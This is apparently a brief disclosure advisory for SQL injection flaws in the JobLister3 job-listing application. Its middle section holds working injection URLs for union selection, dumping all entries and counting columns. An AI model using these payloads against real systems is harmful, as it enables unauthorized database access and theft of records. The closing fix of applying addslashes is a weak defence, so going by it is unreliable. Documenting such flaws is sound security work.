JobLister3 by SkilMatch Staffing Systems, Inc.
Multiple SQL injection vulnerabilities

The search form filed doesnt strip special characters that have special
meanings. A single quote makes the application spit out a number of
errors.
This is not limited to the search query. The GET'd variables also fail to
sanatize characters.
Union selection:
www.example.com/index.php?mode=showbyID&jobid=99786'%20union%20all%20sel
e
ct%20something%20from%20something/\*
Dump of entries:
www.example.com/index.php?mode=showbyID&jobid=99786'%20or%201=1/\*
Using some old fasioned order by work, wee deduce 16 columns
www.example.com/index.php?mode=showbyID&jobid=99786'%20order%20by%2016/\*
Thus, the fix currently would be to impletement addslashes functions to
all areas that recieve (or can recieve) user supplied data.
